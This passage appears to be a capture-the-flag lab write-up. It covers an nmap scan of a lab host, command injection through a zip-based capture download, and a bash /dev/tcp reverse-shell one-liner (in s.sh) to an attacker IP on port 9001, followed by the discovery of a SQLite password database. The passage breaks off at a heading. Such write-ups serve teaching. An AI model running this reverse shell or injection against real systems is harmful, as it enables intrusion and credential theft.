# Enumeration
```
# Nmap 7.94SVN scan initiated Fri Apr 19 19:04:58 2024 as: /usr/bin/nmap -p- --max-retries 1 --max-rate 500 --max-scan-delay 20 -T4 -v --open -oN nmap/Full_10.10.71.110.nmap --system-dns --stats-every 3s 10.10.71.110
Nmap scan report for 10.10.71.110
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Checking the webpage on port 80:
![](attachment/2bd91038639779e61650ac5c23376d45.png)

Now when we download captures and check response on burp suite:
![](attachment/10b7048deb18e22f68b5d1b01726cf24.png)

This output is similar to zip command in linux.
Now trying command injection with zip

We need to upload these files to get command injection:
![](attachment/9d6e513d1bf62dbca276a7f5138c6e96.png)
*s.sh*:
```
0<&196;exec 196<>/dev/tcp/10.8.1.208/9001; /bin/bash <&196 >&196 2>&196
```

Now when we hit download capture we get a shell:
![](attachment/9c92541cc265222c3908b54b827217ea.png)

Now enumerating **/var/www/database** we find `database.sqlite3`
![](attachment/7dc7b02bf534959ccbaa590eff8523ba.png)
And it has passwords


# TCPDump & AppArmor